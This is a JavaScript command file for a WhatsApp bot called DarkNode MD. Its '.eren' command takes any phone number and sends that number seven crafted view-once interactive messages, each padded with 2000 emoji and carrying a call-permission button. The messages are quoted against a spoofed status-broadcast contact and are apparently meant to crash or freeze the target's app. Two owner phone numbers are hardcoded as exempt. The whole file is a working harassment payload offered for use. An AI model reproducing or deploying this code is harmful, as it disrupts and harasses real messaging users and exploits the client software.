// commands/eren.js
const settings = require('../settings');

const fakeMeta = {
    key: {
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        fromMe: false,
        id: 'DARKNODE_META_' + Date.now()
    },
    message: {
        contactMessage: {
            displayName: 'DARKNODE MD',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
            sendEphemeral: true
        }
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    pushName: 'DARKNODE MD'
};

const channelInfo = {
    contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: settings.newsletterJid,
            newsletterName: settings.newsletterName,
            serverMessageId: -1
        }
    }
};

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function erenCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, {
            text: '╭─── ⪨ ❌ RESTRICTED ⪩───⟢\n│ 👤 Owner only command.\n╰────────────⟢\n> © DarkNode MD',
            ...channelInfo
        }, { quoted: fakeMeta });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ 🦾 EREN YEAGER ⪩───⟢\n│ 📌 Usage: .eren <number>\n│ 💡 Example: .eren 628123456789\n│\n│ *Rumbling Activated*\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');

    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ 🛡️ PROTECTED ⪩───⟢\n│ Protected by Survey Corps\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';

    await sock.sendMessage(chatId, {
        text: `╭─── ⪨ 🦾 THE RUMBLING ⪩───⟢\n│ Approaching ${cleanNumber}...\n╰────────────⟢\n> © DarkNode MD`,
        ...channelInfo
    }, { quoted: fakeMeta });
    await sock.sendMessage(chatId, { react: { text: "🦾", key: message.key } });

    try {
        for (let i = 0; i < 7; i++) {
            const rumblingPayload = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            contextInfo: {
                                mentionedJid: [target],
                                isForwarded: true,
                                forwardingScore: 999
                            },
                            body: { text: "✦ Ḕṛḗṅ Ẏḗȧġḗṛ ✦" + "🦾".repeat(2000) },
                            footer: { text: "The Rumbling" },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "TATAKAE", id: "tatakae" }) }
                                ]
                            }
                        }
                    }
                }
            };
            await sock.relayMessage(target, rumblingPayload, { participant: { jid: target } });
        }

        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ ✅ RUMBLING ⪩───⟢\n│ Crushed ${cleanNumber}\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });
        await sock.sendMessage(chatId, { react: { text: "🏔️", key: message.key } });

    } catch (error) {
        console.error('[Eren]', error.message);
        await sock.sendMessage(chatId, {
            text: `╭─── ⪨ ❌ ERROR ⪩───⟢\n│ Rumbling failed: ${error.message}\n╰────────────⟢\n> © DarkNode MD`,
            ...channelInfo
        }, { quoted: fakeMeta });
        await sock.sendMessage(chatId, { react: { text: "❌", key: message.key } });
    }
}

module.exports = erenCommand;